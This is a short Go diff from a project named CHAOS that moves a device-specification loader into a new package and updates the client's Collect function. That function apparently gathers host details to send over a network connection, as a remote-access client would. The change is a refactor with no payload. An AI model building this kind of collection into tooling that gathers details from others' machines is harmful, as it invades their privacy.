@@ -6,6 +6,7 @@ import (
 	"github.com/tiagorlampert/CHAOS/client/app/usecase"
 	"github.com/tiagorlampert/CHAOS/client/app/util"
 	"github.com/tiagorlampert/CHAOS/client/app/util/network"
+	"github.com/tiagorlampert/CHAOS/client/app/util/os"
 	"net"
 )
 
@@ -20,7 +21,7 @@ func NewInformationUseCase(conn net.Conn) usecase.Information {
 }
 
 func (g InformationUseCase) Collect() {
-	info, err := util.PrettyEncode(util.LoadDeviceSpecs())
+	info, err := util.PrettyEncode(os.LoadDeviceSpecs())
 	if err != nil {
 		log.WithField("cause", err.Error()).Fatal("error encoding info")
 	}
